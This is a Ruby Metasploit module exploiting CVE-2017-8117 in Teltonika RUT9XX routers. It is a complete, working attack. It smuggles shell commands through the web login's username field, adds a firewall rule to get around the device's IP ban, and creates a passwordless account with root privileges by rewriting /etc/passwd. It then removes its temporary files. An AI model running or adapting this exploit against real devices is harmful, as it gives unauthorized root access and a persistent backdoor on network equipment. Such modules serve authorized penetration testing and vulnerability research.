##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Teltonika RUT9XX Add User',
      'Description'     => %q{
        CVE-2017-8117 : Issues a remote command on Teltonika RUT9XX series with firmware version <= 00.03.265
        This exploit will bypass IP ban and add a new user with root privileges on the device.
        Modifies /etc/passwd and /etc/shadow files.
      },
      'Author'          => [ 'Adam Jeffreys' ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ 'URL', 'http://example.com' ]
        ],
      'Privileged' => false,
      'Targets' =>
      [
        ['Automatic Target', { } ]
      ],
      'Platform' => 'unix',
      'Arch' => ARCH_CMD,
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'July 04 2017'
    ))
    
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('Username',[ true, 'New user to be created, password will be blank', '']),
        OptString.new('TargetURI', [ true, 'The target URI', '/cgi-bin/luci']),
        OptString.new('LHOST', [ true, 'Your IP address for bypassing IP ban', ''])
      ])
    deregister_options('Proxies','VHOST')
  end

  def send_payl(pay)
    prefix = "m|"
    suffix = "%0A"
    uri = datastore['TargetURI']
    res = send_request_cgi({
      'uri'	=> uri,
      'method' => 'POST',
      'encode_params' => false,
      'vars_post' => {
      'username' => prefix+pay+suffix,
      'password' => "password"
      }
    })
    if res.nil? or res.code != 200
      vprint_error("#{rhost} - There was an error connecting to the device")
      return :abort
    end
  end

  def check_vuln
    send_payl("echo%201%20>%20t.txt")
    res = send_request_cgi({
      'uri'	=> "/t.txt",
      'method' => 'GET',
      'encode_params' => false
    })
    if res and res.code == 200
      print_good("Remote device appears to be vulnerable")
    else
      print_error("Device does not appear to be vulnerable")
      return :abort
    end      
  end

  def run
    #setting up some basic variables
    uri = datastore['TargetURI']
    ip = datastore['LHOST']
    new_user = datastore['Username']
    rhost = datastore['RHOST']
    rport = datastore['RPORT']
    print_status("using the following target URL: "+rhost+":"+rport.to_s+uri)
    check_vuln
    print_status("Bypassing IP banning restriction")
    send_payl("iptables%20-I%20INPUT%20-p%20tcp%20-s%20"+ip+"%20-j%20ACCEPT")
    print_status("Creating user")
    send_payl("adduser%20-D%20"+new_user)
    send_payl("echo%20|%20xargs%20passwd%20"+new_user)
    print_status("Giving root access") # OLDER VERSION EXECUTE TWICE SO CANT DIRECTLY CHANGE PASSWD
    send_payl("cat%20/etc/passwd%20|%20egrep%20-v%20'"+new_user+"'%20>%20/etc/temppasswd")
    send_payl("echo%20'"+new_user+":x:0:0:Linux%20User,,,:/home/"+new_user+":/bin/ash'%20>>%20/etc/temppasswd")
    send_payl("cat%20/etc/temppasswd%20|%20uniq%20>%20/etc/tempfinal")
    send_payl("cp%20/etc/tempfinal%20/etc/passwd")
    print_status("Setting up environment for first login")
    send_payl("mkdir%20/home")
    send_payl("mkdir%20/home/"+new_user)
    send_payl("chown%20"+new_user+"%20/home/"+new_user)
    print_status("Cleaning up...")
    send_payl("rm%20/etc/temp*")
    print_good("Complete! Login via SSH with blank password")
  end
end
